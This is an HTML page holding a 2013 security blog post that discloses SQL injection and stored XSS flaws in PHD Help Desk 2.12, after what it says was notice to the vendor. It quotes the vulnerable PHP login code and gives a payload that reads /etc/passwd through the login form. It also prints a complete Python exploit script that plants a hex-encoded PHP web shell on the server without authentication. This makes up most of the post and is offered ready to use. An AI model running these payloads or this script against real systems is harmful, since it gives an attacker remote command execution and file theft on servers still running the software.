@@ -1,0 +1,538 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>PHD Help Desk 2.12 - SQLi/XSS - forelsec</title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="PHD Help Desk is a help desk application used for managing help tickets in corporate/enterprise environments. The latest version (2.12) is vulnerable &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="forelsec" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">forelsec</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/code">Code</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">PHD Help Desk 2.12 - SQLi/XSS</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-02T23:55:27-06:00" pubdate data-updated="true">Jun 2<span>nd</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="http://www.p-hd.com.ar/">PHD Help Desk</a> is a help desk application used for managing help tickets in corporate/enterprise environments.  The latest version (2.12) is vulnerable to, well, quite a few instances of SQLi and XSS.  I&rsquo;ll try and go through a couple, but there are so many it&rsquo;s sort of embarrassing, and none of them are at all complex.  The software is clocking ~200 downloads/week on Sourceforge, and no telling how many off their website, so it&rsquo;s definitely still out there somewhere.  These issues have been disclosed to the vendor and a generous amount of time to fix them has since passed.</p>
+
+<p>The first place we&rsquo;ll start is <code>login.php</code>, which tellingly holds all of the login logic.  Here&rsquo;s the relevant bit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$operador=trim(strip_tags($_POST[operador]));
+</span><span class='line'>$query="SELECT * FROM {$MyPHD}operador WHERE operador_id='$operador'";
+</span><span class='line'>$result=mysql_query($query) or die(mysql_error());
+</span><span class='line'>$q_filas=mysql_num_rows($result);
+</span><span class='line'>
+</span><span class='line'>if($q_filas!=1)
+</span><span class='line'>       {$mensaje=$Oper_not_autorized;
+</span><span class='line'>        require($Include.'login.inc');
+</span><span class='line'>        exit();
+</span><span class='line'>       }
+</span><span class='line'>
+</span><span class='line'>### Ahora verifico la contraseña
+</span><span class='line'>$md5_contrasenia=md5($_POST['contrasenia']);
+</span><span class='line'>
+</span><span class='line'>$query="SELECT * FROM {$MyPHD}operador WHERE operador_id='$operador' AND contrasenia='$md5_contrasenia'";
+</span><span class='line'>$result=mysql_query($query) or die (mysql_error());;
+</span><span class='line'>$q_filas=mysql_num_rows($result);
+</span><span class='line'>
+</span><span class='line'>if ($q_filas!=1)
+</span><span class='line'>             {$mensaje=$Invalid_passwd;
+</span><span class='line'>             require($Include.'login.inc');
+</span><span class='line'>             exit();
+</span><span class='line'>            }
+</span><span class='line'>
+</span><span class='line'>$data=mysql_fetch_array($result);
+</span><span class='line'>if ($data['nivel']&lt;1)
+</span><span class='line'>               {$mensaje=$Oper_not_autorized;
+</span><span class='line'>                require($Include.'login.inc');
+</span><span class='line'>                exit();
+</span><span class='line'>               }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This doesn&rsquo;t even really try to sanitize anything.  <a href="http://php.net/manual/en/function.strip-tags.php">strip_tags</a> is used to remove HTML and PHP tags from a string, and <a href="http://php.net/manual/en/function.trim.php">trim</a> strips whitespace; what?  It pulls out the username, checks it in the database, then pulls the password, md5&rsquo;s it, and checks that in the database.  Plenty of opportunity for SQLi, but no way to get around the login screen with a simple <code>' OR '1=1</code>, due to the final query using the md5 of the password.  We could use a malicious username and comment that out, but then the first query would fail.  So instead, we&rsquo;ll just use the username to run malicious queries.</p>
+
+<p>Submitting the following POST data to login.php will dump <code>/etc/passwd</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>operador=' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE '/var/www/phd_2_12/psswd&contrasenia=asdf&submit=Enter&captcha=</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg"></p>
+
+<p>With this, we can naturally obtain a web shell, as demonstrated by the exploit code I&rsquo;ve developed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~# python phd_sqli.py -h
+</span><span class='line'>usage: phd_sqli.py [-h] [-i IP] [-p ROOTP] [-w PATH]
+</span><span class='line'>
+</span><span class='line'>optional arguments:
+</span><span class='line'>  -h, --help  show this help message and exit
+</span><span class='line'>  -i IP       server address
+</span><span class='line'>  -p ROOTP    path to login.php (/phd_2_12)
+</span><span class='line'>  -w PATH     writable web path (/var/www/phd_2_12) for shell
+</span><span class='line'>root@jali:~# python phd_sqli.py -i 192.168.1.83
+</span><span class='line'>[!] Dropping web shell on 192.168.1.83...
+</span><span class='line'>[!] Shell dropped.  http://192.168.1.83/phd_2_12/0m05k.php?rr=ls
+</span><span class='line'>root@jali:~# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>As a note, <code>strip_slashes</code> prevents us from submitting anything that includes HTML or PHP tags in it. So I&rsquo;ve gotten around that by simply hex encoding the string:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># &lt;? php system($_GET["rr"]); ?&gt;
+</span><span class='line'>data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
+</span><span class='line'>                                     ',2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE'
+</span><span class='line'>                                     ' \'{0}/{1}.php'.format(options.path,shell)),
+</span><span class='line'>                         'contrasenia':'pass',
+</span><span class='line'>                         'submit':'Enter',
+</span><span class='line'>                         'captcha':''})</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There&rsquo;s another SQLi vulnerability in <code>abro_adjunto.php</code>, which requires authentication to the application:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if (isSet($_GET['file']))
+</span><span class='line'>
+</span><span class='line'>    {$query="SELECT *
+</span><span class='line'>             FROM {$MyPHD}sigo_ticket
+</span><span class='line'>             WHERE seq_sigo_ticket_id={$_GET['file']} ";
+</span><span class='line'>             
+</span><span class='line'>     $result=mysql_query($query) or die (mysql_error());
+</span><span class='line'>     
+</span><span class='line'>     $row = mysql_fetch_array($result);
+</span><span class='line'>
+</span><span class='line'>     $tipo_adjunto = $row['tipo_adjunto'];
+</span><span class='line'>     $adjunto = $row['adjunto'];
+</span><span class='line'>     $nombre_adjunto = $row['nombre_adjunto'];
+</span><span class='line'>
+</span><span class='line'>     if(strlen($nombre_adjunto)&gt;1)
+</span><span class='line'>        {header("Content-type: $tipo_adjunto");
+</span><span class='line'>         header("Content-Disposition: attachment; filename=\"$nombre_adjunto\"");
+</span><span class='line'>         echo $adjunto;
+</span><span class='line'>        }
+</span><span class='line'>     else
+</span><span class='line'>        {require('head.inc');
+</span><span class='line'>         echo "&lt;div class='error'&gt;INVALID CALL &lt;/div&gt;";
+</span><span class='line'>        }
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the sanitization for this (and most files, really) is as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if (get_magic_quotes_gpc())
+</span><span class='line'>    { foreach($_GET as $clave =&gt; $valor)
+</span><span class='line'>      {$_GET[$clave]=stripslashes($_GET[$clave]);
+</span><span class='line'>      }
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>foreach($_GET as $clave =&gt; $valor)
+</span><span class='line'>     {$_GET[$clave]=trim(htmlentities($_GET[$clave],ENT_QUOTES));
+</span><span class='line'>     }</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a>, when specified with the ENT_QUOTES flag, will convert both single and double quotes into HTML entities, and will thus not be injectable.  However, the above query doesn&rsquo;t even use quotes, thus there is nothing to escape.</p>
+
+<p>There&rsquo;s stored XSS within all Attributes (Contact, Process, State, Type) that&rsquo;s loaded when viewing users:</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg"></p>
+
+<p>Here&rsquo;s the code for dropping a web shell; enjoy:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Exploit Title: PHD Help Desk 2.12 SQLi
+</span><span class='line'># Date: 05/24/2013
+</span><span class='line'># Exploit Author: drone (@dronesec)
+</span><span class='line'># Vendor Homepage: http://www.p-hd.com.ar/
+</span><span class='line'># Software Link: http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip
+</span><span class='line'># Version: 2.12
+</span><span class='line'># Tested on: Ubuntu 12.04 (apparmor disabled)
+</span><span class='line'>
+</span><span class='line'>""" This app is so full of SQLi & XSS; if you're looking for
+</span><span class='line'>    practice with real web apps, this is a good place to go.
+</span><span class='line'>
+</span><span class='line'>    You don't need auth for this.
+</span><span class='line'>    @dronesec
+</span><span class='line'>"""
+</span><span class='line'>from argparse import ArgumentParser
+</span><span class='line'>import string
+</span><span class='line'>import random
+</span><span class='line'>import urllib, urllib2
+</span><span class='line'>import sys
+</span><span class='line'>
+</span><span class='line'>def run(options):
+</span><span class='line'>    print '[!] Dropping web shell on %s...'%(options.ip)
+</span><span class='line'>
+</span><span class='line'>    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
+</span><span class='line'>
+</span><span class='line'>    # &lt;? php system($_GET["rr"]); ?&gt;
+</span><span class='line'>    data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
+</span><span class='line'>                                    ',null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE'
+</span><span class='line'>                                        ' \'{0}/{1}.php'.format(options.path,shell)),
+</span><span class='line'>                             'contrasenia':'pass',
+</span><span class='line'>                             'submit':'Enter',
+</span><span class='line'>                             'captcha':''})
+</span><span class='line'>
+</span><span class='line'>    urllib2.urlopen('http://{0}{1}/login.php'.format(options.ip, options.rootp), data)
+</span><span class='line'>    print '[!] Shell dropped.  http://%s%s/%s.php?rr=ls'%(options.ip,options.rootp,shell)
+</span><span class='line'>
+</span><span class='line'>def parse():
+</span><span class='line'>    parser = ArgumentParser()
+</span><span class='line'>    parser.add_argument('-i',help='server address',action='store',dest='ip')
+</span><span class='line'>    parser.add_argument('-p',help='path to login.php (/phd_2_12)',action='store',
+</span><span class='line'>                default='/phd_2_12', dest='rootp')
+</span><span class='line'>    parser.add_argument('-w',help='writable web path (/var/www/phd_2_12) for shell',
+</span><span class='line'>                default='/var/www/phd_2_12/', action='store', dest='path')
+</span><span class='line'>
+</span><span class='line'>    options = parser.parse_args()
+</span><span class='line'>    if not options.ip:
+</span><span class='line'>        parser.print_help()
+</span><span class='line'>        sys.exit(1)
+</span><span class='line'>
+</span><span class='line'>    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
+</span><span class='line'>    options.rootp = options.rootp if options.path[-1] != '/' else options.path[:-1]
+</span><span class='line'>    return options
+</span><span class='line'>
+</span><span class='line'>if __name__=="__main__":
+</span><span class='line'>    run(parse())</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="http://www.exploit-db.com/exploits/25915/">Exploit</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-02T23:55:27-06:00" pubdate data-updated="true">Jun 2<span>nd</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/phd/'>phd</a>, <a class='category' href='/blog/categories/sqli/'>sqli</a>, <a class='category' href='/blog/categories/xss/'>xss</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss/" data-via="" data-counturl="http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/05/21/kimai-v0.9.2-sqli/" title="Previous Post: Kimai v0.9.2 - SQLi">&laquo; Kimai v0.9.2 - SQLi</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/06/05/asus-rt56u-remote-command-injection/" title="Next Post: Asus RT56U Remote Command Injection">Asus RT56U Remote Command Injection &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/03/02/introduction/">introduction</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/02/24/ganib-project-management-2.3-sqli/">ganib project management 2.3 SQLi</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/01/26/fetching-jboss-mbean-method-hashes/">Fetching JBoss MBean method hashes</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/">Dolibarr 3.4.0 - Multiple Vulnerabilities</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/">OpenEMM-2013 SOAP SQLi/Stored XSS</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
